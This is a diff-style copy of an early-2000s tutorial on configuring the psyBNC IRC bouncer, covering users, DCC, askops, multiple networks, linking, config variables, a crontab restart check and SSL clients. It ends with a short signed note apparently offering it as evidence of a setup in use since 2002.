+   User Management
+
+   Obviously, if you have your bnc compiled as singleuser, this section
+   is pointless for you. But for everyone else, I'm sure you want to add
+   in other users, delete them, etc... Here's the commands to do it:
+   /adduser [user] :[real name] -- the [user] is what the person will
+   have to set their ident to. The [real name] part is what ppl will see
+   when doing a /whois. for example:
+   /adduser jestrix :me love you long time
+   will show this in the first line of a whois:
+   jestrix is ident@vhost * me love you long time.
+   /deluser [user] -- deletes the user.
+   /password [new pass] -- changes your password. If you're an admin, you
+   can change other ppl's passwords:/password [user] :[pass]
+   /madmin [user] -- makes a user into an admin (choose your admins
+   carefully!)
+   /unadmin [user] -- removes admin rights from a user.
+   /bwho --- see who is added to your bouncer. Also shows if they're
+   connected, what server they're connected to, and what their IP is.
+
+   I recommend you secure your bnc even more by restricting what IPs can
+   connect to it:
+   /addallow [IP or mask] --- lets whatever IP or mask you specify
+   connect to the bnc. IPs can be definite, ie. 12.12.12.34 or masked,
+   12.12.12.*. You can also use hostnames and masks such as *.myisp.com.
+   /listallow --- lists the allowed connections.
+   /delallow [n] --- deletes allow #n as shown by listallow.
+
+
+
+   DCC Stuff
+
+   This section assumes that you compiled your bnc with DCCFILE and
+   DCCCHAT. If you did not, then you can do all your dcc stuff as you
+   normally would in your irc client, but remember that your real IP will
+   be revealed by doing this. Like I stated before, the benefit of psyBNC
+   is that it hides your IP during DCC sessions, but in order to do this,
+   your life gets a bit harder. First, let's go over the basic DCC
+   commands:
+   /dccchat [user] --- opens a dcc chat session with the user you
+   specify.
+   /dccsend [file] :[user] --- sends a file to the person you specify.
+   The file MUST be in ~/psybnc/downloads/USERx (where USERx is your user
+   #. Not sure what your user # is? do a /bwho
+   /dccanswer [user] --- if someone sends you a dcc chat request, psy
+   will inform you through a notice. You must then type this to accept
+   the request.
+   /dccget [file] :[user] --- gets a file that was dcc'd to you by
+   someone. This file will be stored in the ~/psybnc/downloads/USERx
+   directory.
+   /dccsendme [file] --- tells psy to send you the file you specify. Use
+   this after you get a file from another user and then want to get it
+   from your shell. This is the only way people without shell access can
+   get their files.
+   /listdcc --- lists all dcc's
+   /dcccancel [n] --- cancels dcc # n as shown by /listdcc
+
+   If you wish to use SSL encrypted DCC sessions, precede the value of
+   the command with "S=" ie: /dccchat S=l33th4x0r - Note that the other
+   person must have an SSL capable client.
+
+   Now for the cool stuff :) my favorite feature of psy is its ability to
+   stay permanently connected to a bot through a DCC, and to ask this bot
+   for ops. As anyone who has experience with running a botnet knows, one
+   of the easiest ways for a channel to be taken over is to have some
+   idiot /msg [bot] OP [password], when the bot's nick was taken by
+   someone else. With psy, however, the askop request can be done two
+   ways: through the partyline when a DCC is initiated, or through a msg
+   that first checks the mask of the person being sent the request.
+   Sweet, eh? So, the commands to do it:
+   /adddcc [botname] [username] [password] :[host]:[port] --- The botname
+   is obviously the name of the bot, The username and password are your
+   personal l/p that you use to gain access to the bot's partyline. The
+   host is the host of the bot. It can be either the alpha-form, or the
+   actual IP address. I prefer the actual IP address, since it's possible
+   DNS can be down. And finally, the port is the port that the bot
+   listens on for user connections. Some bots listen for other bots on
+   one port and for users on another, so make sure you get the right one
+   :)
+   /listdcc --- lists all dcc's
+   /deldcc [n] --- deletes dcc # n as shown by /listdcc
+
+   Now, for the askops part: This part assumes you added in a DCC to the
+   bot as shown above. If you don't have partyline access, you can still
+   add an askop, but I'll get to that later.
+   /addask [#chan] [password] :-[botname] --- The chan is the channel you
+   want to get ops on, the password is your password, and the bot's nick,
+   preceded with a :-, is the bot which you have a dcc enabled to.
+   /listask --- lists all the askops you have
+   /delask [n] --- deletes askop # n as shown by /listask
+
+   Now, if you don't have partyline access, you can add the askop in this
+   way:
+   /addask [#chan] [password] :[bothost] --- where chan is the channel
+   you want to be opped on, your password is your password (duh), and the
+   bothost is the bot's hostmask. A hostmask, for the uninformed, is
+   formed like this: username!ident@host. Since a bot is set to use a
+   different nick if someone takes their default, set the host for
+   something like: *!mybot@damn.cool.vhost.com.
+
+
+
+   Multiple Networks
+
+   One of my other favorite things about psyBNC :) Do you have a bunch of
+   channels you hang in on efnet, but also one or two channels on dalnet
+   that you like to go to? If you're like me, you do...but you alo hate
+   having multiple mirc sessions open. Fret no more! psyBNC can solve
+   your problems by allowing you to connect to more than one network with
+   the same mirc client. For this section I'll assume that you're
+   familiar with most of the commands in psy. If not, get familiar with
+   them before you try to do this. Ok, let's get into the commands.
+
+   The first thing you need to do is add in another network:
+   /addnetwork [name] --- adds in a network with the name you specify.
+   Keep in mind that network names are case-sensitive. Furthermore,
+   you'll be typing the name a lot, so if you're adding in dalnet, use
+   the name dal or dn or something similar.
+
+   Once you have the network added, you need to choose your vhost for
+   that network. If you don't choose one, it'll default to the IP the bnc
+   is on, usually something gay like "my-shell-company.com". So:
+   /bvhost [network]~[vhost] --- sets your vhost on the network you
+   specify.
+
+   See this command? This is the format for all commands used on multiple
+   networks. Simply prefix the syntax of the command with [network]. So,
+   to give some other examples:
+   /addserver dn~irc.dal.net:6667 --- adds in the server irc.dal.net with
+   port 6667 to the dn network.
+   /join dn~#fxp --- joins #fxp on network dn. (btw, I hear that some
+   freaky ppl hang in this particular channel ;)
+   /msg dn~joeschmoe beeyatch --- sends the message "beeyatch" to the
+   user with the nick joeschmoe on network dn.
+
+   Now, some weird things about multiple networks:
+   � Your nick in the nicklists for channels on other networks will show
+   the nick you're using on your primary network. So, even if you do:
+   /nick dn~TwatMuffin, even though other ppl will now see you as
+   TwatMuffin in their list, you'll see yourself as jestrix, or whatever
+   nick you use.
+   � If you get opped/voiced in a channel, you won't see it in the
+   nicklist. You'll just appear to be a regular schmoe.
+   � Let's say JoeSmith is in #chat on efnet, your primary network. You
+   head over to dalnet, and he's there in #fxp. Everyone else in #fxp
+   will look like dn~BobJones, but JoeSmith will be just JoeSmith. If you
+   try to msg him by dbl-clicking on his nick int he dalnet channel,
+   you'll really be sending a msg to him on efnet. You have to use
+   dn~JoeSmith to talk with him on dalnet.
+
+   Some final things. Maybe you don't always want to be on more than one
+   network. I prefer to always be on efnet, and then head to my other
+   networks when I want to talk with ppl there.
+   /bconnect [network]~ --- connects you to the network you specify
+   (assuming you have servers added for that network)
+   /bquit [network]~ --- quits you from that network. You'll still be
+   connected to your primary network. Note, if you do /bquit, you'll be
+   quitted from all your networks.
+   /switchnet [new network] :[current network] --- This command will let
+   you switch your primary network. By doing this, you won't have to
+   prefix all your commands with the ~net syntax.
+   For example, let's say that you are on EFNet and DalNet. Efnet is your
+   primary network (you dont need to prefix anything with the ~ format)
+   and DalNet is added as ~dn. If you currently did /msg jestrix, you
+   would be messaging jestrix on efnet.
+   If you do /switchnet dn :ef your current network will be assigned to
+   dn - DalNet. Now if you /msg jestrix you will get jestrix on DalNet.
+   To msg him on EFNet, you would have to do /msg ef~jestrix - since ef
+   was the prefix you assigned in the switchnet command. To switch back
+   to your original config, you'd do: /switchnet ef :dn
+
+   OK, multiple networks also includes the psy internal network. Think of
+   it as an ircd inside your bnc. By using the network name int you can
+   create private channels that only ppl connected to your bnc can
+   access.
+   For example, /join int~#partyline will have you join the internal
+   channel #partyline. You can set modes/ops/topic in the internal
+   channels just like you would on a normal channel. do a whois on
+   someone in an internal channel, it looks neat ;)
+   You can also privately msg other people connected to your bnc: /msg
+   $[nick]. Prefix it with a $ and psy will send it directly to the
+   person on the bnc; it will not pass through the irc server. (So if you
+   both are on SSL-enabled clients/bncs - the message is perfectly secure
+   in transit!)
+
+
+
+   Linking
+
+   A cool aspect of psy is the ability form a psy-net through the linkage
+   of multiple psybncs. The benefit of this is to create a private
+   internal network secure from snooping, and secure from takeovers!
+   Furthermore, you can let ppl on other bouncers use your machine's
+   vhosts if you wish. As you should have realized by now, preceding an
+   IP with S= creates an SSL port.
+
+   So, to create a link to another bouncer:
+   /linkto [name of other bnc] :[IP]:[port]
+
+   The other bouncer would have to do the following:
+   /linkfrom [name of other bnc] :[IP]:[port]
+
+   To view all your links:
+   /listlinks
+
+   I love to have everything encrypted, including my links. To create an
+   encrypted link:
+   /setlinkkey [link #] :[password]
+   After doing this on both psy's, do:
+   /relink [link #] on either bouncer to reset
+
+   To enable the sharing of vhosts:
+   /relaylink [name of other bnc] :n --- where n=0 to disable vhost
+   sharing; 1 to enable it.
+
+   Final note: If you use hostmasks to restrict connections to your bnc,
+   you must add the other bnc's IP as an allowed host!!
+
+
+
+   Appendix
+
+   For one reason or another, you might want to edit your psybnc.conf
+   (especially if menuconfig doesn't work for you). So, here are the
+   applicable lines and what they mean. I'm sure I've missed a few lines,
+   so if you find anything and know what it does, please email me at
+   jestrix(at)jestrix(dot)net. Note that all the variables in psybnc.conf
+   are CAPITALIZED and that there are no spaces on either side of the
+   equal sign.
+   Variables are shown in this style.
+
+
+   ###SYSTEM SETTINGS###
+   PSYBNC.SYSTEM.PORT1= The port your bnc is going to listen on. use a
+   PORTx variable if you want multiple ports.
+   PSYBNC.SYSTEM.ME= The name of your bouncer.
+   PSYBNC.SYSTEM.HOST1= The IP your bnc is going to listen on. Use HOSTx
+   for multiple hosts. If you want an SSL port, Put an 'S=' before the
+   IP.
+   PSYBNC.SYSTEM.DCCHOST= The IP that will be used for DCC sessions.
+   PSYBNC.HOSTALLOWS.ENTRY0= The first IP that will be allowed to connect
+   to your bouncer. Use *;* for everyone. This can include masks. The
+   first * indicates the IP, not sure what the * after the ; denotes...
+   can't find anything anywhere about it.
+
+
+   ###USER SETTINGS###
+   (note that USERx can be substituted for USER1 where x is an integer)
+   USER1.USER.LOGIN= The login name for the user (ident)
+   USER1.USER.NICK= The nick the user will use on irc.
+   USER1.USER.USER= The 'real name' of the user (what appears in the
+   whois)
+   USER1.USER.PASS= The password of the user (this will be shown in
+   encrypted form; if you change the password in psybnc, then restart it,
+   the password will become encrypted.)
+   USER1.USER.RIGHTS= 0-not an admin; 1-an admin
+   USER1.USER.ACOLLIDE= 0-disable anti-collide; 1-enable anti-collide
+   USER1.USER.SYSMSG= 0-Do not show system messages to the user; 1-Show
+   them
+   USER1.USER.VHOST= The user's vhost
+   USER1.USER.AWAYNICK= The user's away nick
+   USER1.USER.AWAY= The user's away msg
+   USER3.USER.LEAVEMSG= The message shown when you disconnect from the
+   bnc
+   USER1.USER.VLINK= (0/1) Not sure what this does (default =0)
+   USER1.USER.PPORT= (0/1) Not sure what this does (default =0)
+   USER1.USER.PARENT= (0/1) Not sure what this does (default =0)
+   USER1.USER.QUITTED= 0-User is connected to irc; 1-User is quitted
+   USER1.USER.DCCENABLED= 0-dcc is diabled; 1-dcc is enabled.
+   USER1.USER.AIDLE= 0-anti-idle is disabled; 1-it's enabled.
+   USER1.USER.LEAVEQUIT= 0-when the user disconnects from the bnc, they
+   stay on all their channels; 1-when they quit, they leave all the
+   channels, but still stay connected to irc.
+   USER1.USER.AUTOREJOIN= 0-if you get kicked when not on the bnc, psy
+   will not rejoin the channel; 1-psy sill rejoin the channel for you if
+   you get kicked.
+   USER1.USER.LASTLOG= (0/1) Not sure what this does (default =0)
+   USER1.SERVERS.SERVER1= The first server of the user.
+   USER1.SERVERS.PORT1= The port for server number 1.
+   USER1.CHANNELS.ENTRY0= The first channel the user wants to sit on.
+   USER1.CHANNELS.KEY0= The key for the first channel. (This is encrypted
+   as of version 2.3.0)
+   USER1.INTCHANS.ENTRY0= An internal channel the user wants to sit on.
+   USER1.AOP.ENTRY1=Entry for someone to get ops from your client in the
+   form of hostmask;password. (not covered in this tutorial)
+
+
+   ###LINKAGE STUFF###
+   LINKS.LINK1.PORT= Port for link 1
+   LINKS.LINK1.NAME= name of the otehr bnc
+   LINKS.LINK1.IAM= name of the other bnc (redundant?)
+   LINKS.LINK1.HOST= IP of the link
+   LINKS.LINK1.PASS= Password for the link (used only by the bncs)
+   LINKS.LINK1.ALLOWRELAY= 0-Do not share vhosts; 1-Allow the sharing of
+   vhosts
+   LINKS.LINK1.CRKEY= Key set by negotiation between the bncs
+   LINKS.LINK1.TYPE= 0-Your bouncer links to theirs; 1-Their bouncer
+   links to yours.
+
+
+   ###DCC AND ASKOP STUFF###
+   (note: I don't recommend editing any of these variables through
+   psybnc.onf -> use the commands in mirc.
+   USER1.DCC.ENTRY0= Stuff pertaining to DCC #0
+   USER1.ASK.ENTRY0= Stuff pertaining to AskOp #0
+
+
+
+   Setting Crontab
+
+   The basic form for a crontab entry is (to the best of my knowledge):
+   <minute> <hour> <day> <week> <month> <process to run>
+
+   So, if you like to check every 10min, it would be:
+   0,10,20,30,40,50 * * * * /path/to/my/process
+
+   Included with psybnc is psybncchk. Open this file and change the line
+   that reads PSYBNCPATH=/set/path/here. Set it to your psybnc directory
+   of course. Make sure this file has execute perms; in your shell, type:
+   chmod 700 psybncchk
+
+   Then add the following to your crontab (use crontab -e to edit your
+   crontab): (this example is for a check every 10 minutes:
+   0,10,20,30,40,50 * * * * /l33t/shell/psybnc/psybncchk >/dev/null 2>&1
+
+   The >/dev/null 2>&1 part tells crontab not to send you an e-mail
+   whenever it restarts psybnc. Omit that part if you like e-mail.
+
+----------
+----------
+Our crontab is unaltered since 2002.
+----------
+----------
+
+
+   SSL Enabled Clients
+
+   If you have compiled psyBNC with SSL and created an SSL listening
+   port, you must use an SSL capable client to connect. It is possible to
+   use any client with SSL if you create a tcp wrapper (using something
+   such as stunnel), but I will not get into that. So if you're using
+   mIRC or another non-SSL client, search google for tutorials on how to
+   create an SSL wrapper.
+
+   At the moment, I am only aware of 1 client with built in SSL support
+   (tho I may be prejudiced since it is the only client i use other than
+   BX): XChat. I highly recommend this client - both for real operating
+   systems like linux or BSD, and even for windows. One thing to note:
+   when connecting to your bnc w/ SSL, tell XChat to accept invalid
+   certs! Going by SSL-standards, an application that encounters a
+   self-signed certificate (which I guarantee you have) should either
+   prompt the user for confirmation or kill the connection. XChat chooses
+   the latter (something i disagree with) but by telling it to accept
+   invalid certs, it will work fine.
+
+   If you use an SSL compatible client that you'd like listed here, send
+   me the info and a link at jestrix(at)jestrix(dot)net
+
+
+
+   LICENSE
+
+   Copyright �2002,2003 jestrix <jestrix(at)jestrix(dot)net>
+   Permission is granted to copy, distribute and/or modify this document
+   under the terms of the GNU Free Documentation License, Version 1.2
+   or any later version published by the Free Software Foundation;
+   with no Invariant Sections, no Front-Cover Texts, and no Back-Cover
+   Texts.
+   A copy of the license is included on this site at:
+   http://www.jestrix.net/tuts/GNU-FDL.txt
+
+
+
+------------------
+------------------
+There endeth the rant, and I'm going to sleep. 
+
+- Hope this helps! Like I said, if you want stat decs, signed statements,
+just ask. 
+
+
+Mike
+
+
+
